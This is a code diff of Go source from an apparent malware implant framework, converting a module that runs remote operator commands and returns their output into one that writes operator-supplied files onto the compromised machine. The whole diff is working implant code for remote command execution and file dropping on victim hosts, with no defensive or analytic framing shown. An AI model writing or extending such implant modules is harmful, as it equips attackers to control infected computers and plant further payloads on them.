@@ -1,10 +1,10 @@
-package sh
+package file_uploader
 
 import (
+	"io/ioutil"
 	"malware/common"
 	"malware/common/messages"
 	"malware/common/types"
-	"os/exec"
 )
 
 type state struct {
@@ -22,17 +22,18 @@ func Create() types.Module {
 }
 
 func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.ImplantReply)) {
-	cmd := message.GetExec()
-	if cmd == nil {
+	file := message.GetUploadfile()
+	if file == nil {
 		return
 	}
 
-	out, err := exec.Command(cmd.Exec, cmd.Args...).Output()
+	err := ioutil.WriteFile(file.Filename, file.Contents, 0644)
+
 	if err != nil {
-		common.Panicf(err, "Error on running command: %s", message)
+		common.Panicf(err, "Erroring loading file")
 	}
 
-	callback(&messages.ImplantReply{Module: "sh", Args: out})
+	callback(&messages.ImplantReply{Module: settings.ID(), Args: []byte("Written")})
 }
 
 // Init the state of this module
@@ -44,4 +45,4 @@ func (settings settings) Shutdown() {
 	settings.state.running = false
 }
 
-func (settings) ID() string { return "adam" }
+func (settings) ID() string { return "file_uploader" }
